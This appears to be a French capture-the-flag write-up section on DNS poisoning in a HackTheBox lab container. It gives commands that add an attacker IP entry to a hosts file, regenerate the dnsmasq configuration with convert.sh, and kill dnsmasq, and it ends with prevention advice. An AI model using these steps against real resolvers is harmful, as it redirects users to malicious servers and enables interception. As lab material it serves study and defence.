# Empoisonnement DNS

### <mark style="color:red;">Empoisonnement DNS</mark>

#### 🎯 Concept

L'empoisonnement DNS consiste à modifier les résolutions DNS pour rediriger le trafic vers un serveur malveillant.

#### 🔍 Architecture

```
Utilisateur → DNS empoisonné → Serveur malveillant (au lieu du serveur légitime)
```

#### 💡 Fichiers impliqués

**Structure DNS dans le conteneur :**

```
/dns/
├── hosts              # Entrées DNS principales
├── hosts-user         # Entrées utilisateur
├── convert.sh         # Script de conversion
└── entries/           # Fichiers générés pour dnsmasq
```

#### 🛠️ Étapes d'exploitation

**1. Modification des entrées DNS**

```bash
echo "10.10.14.10 match.sorcery.htb" >> /dns/hosts-user
```

**2. Conversion et application**

```bash
bash convert.sh
pkill -9 dnsmasq
# dnsmasq redémarre automatiquement via supervisord
```

**3. Vérification**

```bash
nslookup match.sorcery.htb
# Devrait retourner 10.10.14.10
```

#### 📝 Script convert.sh

```bash
#!/bin/bash
# Concatène hosts et hosts-user
cat /dns/hosts /dns/hosts-user > /tmp/all_hosts

# Convertit au format dnsmasq
while read line; do
    ip=$(echo $line | awk '{print $1}')
    domain=$(echo $line | awk '{print $2}')
    echo "address=/$domain/$ip" >> /dns/entries/custom.conf
done < /tmp/all_hosts
```

#### 🔒 Prévention

* Restreindre l'accès en écriture aux fichiers DNS
* Utiliser DNSSEC pour valider les réponses
* Monitorer les changements de configuration
* Implémenter des ACLs strictes
* Utiliser des DNS récursifs sécurisés
